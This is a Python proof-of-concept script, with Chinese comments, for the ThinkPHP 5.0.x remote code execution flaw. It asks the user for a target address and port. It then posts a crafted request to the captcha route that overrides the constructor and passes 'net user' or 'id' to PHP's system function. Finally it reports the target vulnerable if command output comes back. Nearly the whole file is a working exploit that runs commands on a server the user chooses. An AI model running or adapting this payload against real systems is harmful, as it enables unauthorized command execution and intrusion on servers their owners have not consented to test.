# coding=utf-8
import requests
import sys
def think_check(ip, port, code):
    #目标的路径根据每个系统的不同而设定
    target = 'http://{ip}:{port}/thinkphp22/public/index.php?s=captcha'.format(ip=ip, port=port)
    print("target = '%s'" % target)
    if code == 1:
        exec_sys = 'net user'
    elif code == 2:
        exec_sys = 'id'
    else:
        print('输入code值有误或没有输入数字或字符')
        sys.exit()
    data = {
        '_method': '__construct',
        'filter[]': 'system',
        'method': 'get',
        'server[REQUEST_METHOD]': exec_sys
    }
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
    }
    try:
        #proxies = {"http": "127.0.0.1:8080"}  timeout=3
        resp = requests.post(url=target, data=data, headers=headers, proxies={"http": "127.0.0.1:8080"})

        if 'Windows IP' in resp.text or 'V5.0.22' in resp.text or 'V5.0.23' in resp.text or ('uid=' and 'gid=') in resp.text or 'PHP Version' in resp.text:
            return True
        else:
            return False
    except:
        print("Target cannot be accessed")
        sys.exit()
if __name__ == '__main__':
    try:
        ip = input("Please enter the target address,for example：www.baidu.com or 192.168.1.1\n")
        port = int(input("Please enter the target port,for example：8080\n"))
        code = int(input("Please enter the code,1 stands for windows,2 stands for linux\n"))
        if port not in range(0, 65536):
            port = 80
    except:
        print('输入有误或没有输入数字或字符')
    else:
        i = think_check(ip, port, code)
        if i:
            print('The vulnerability is existed in ThinkPHP')
        else:
            print("The vulnerability isn't existed in ThinkPHP")

